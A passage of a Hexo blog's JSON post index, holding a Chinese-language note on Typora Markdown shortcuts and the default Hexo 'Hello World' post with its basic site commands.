包名.模块名","categories":[],"tags":[]},{"title":"Typora的使用笔记","slug":"Typora使用笔记","date":"2024-04-07T11:00:20.825Z","updated":"2024-04-08T08:42:40.449Z","comments":true,"path":"2024/04/07/Typora使用笔记/","permalink":"https://yzlsjr.github.io/2024/04/07/Typora%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","excerpt":"","text":"一.标题代码： 12# 一级标题## 二级标题 ctrl+数字1~6 相应级别 ctrl+0 普通文本 ctrl+加号&#x2F;减号 级别加减 二.段落 换行 shift + enter 小换行 enter 大换行 分割线 语法：—或***+回车 三.文字显示 字体 类型 符号 快捷键 粗体 ** ** ctrl + B 删除线 ~~ ~~ shift + Alt + 5 下划线 &lt;u&gt; &lt;u&gt; ctrl + u 斜体 * * ctrl + L 高亮 &#x3D;&#x3D; &#x3D;&#x3D; 无 如果要显示*要输入\\* 上下标 上标 ^ ^ 下标 ~ ~ 四.列表 无序列表 代码： 1*/-/+ +空格 快捷键：ctrl + shift + ] 效果：只有同一级 苹果 香蕉 橘子 子集类： 一级 二级 三级 TAB键向下移动一级，shift + TAB 键向上一级 有序列表 数字 + . + 空格 快捷键 ：ctrl + shift + [ 效果： aaa bbb ccc 按退格键输入正常文本 任务列表 1实心点 加 []+空格 快捷键：ctrl + shift + x 效果 五.区块代码： 12&gt; + 空格两个&gt;为两层嵌套，以此类推 效果: aaa bbb ccc 六.代码1.行内代码 12` `快捷键：ctrl + shift + ` 效果：print() 2.代码块 1快捷键：ctrl + shift + K 效果: 1234 七.链接快捷键：ctrl + k 跳转方法：按ctrl + 点击 [跳转地址名称](链接) 跳转标题的方法： [名称](#标题) 效果： 标题一 八.脚注文字后加[^文本] 效果： 文字^1 九.图片方法：！[]() 左&#x2F;右对齐 align&#x3D;”right&#x2F;left” 十.表格快捷键：ctrl + T 效果： shift + enter 一格内多行","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2024-04-07T10:42:54.363Z","updated":"2024-04-07T10:42:54.363Z","comments":true,"path":"2024/04/07/hello-world/","permalink":"https://yzlsjr.github.io/2024/04/07/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}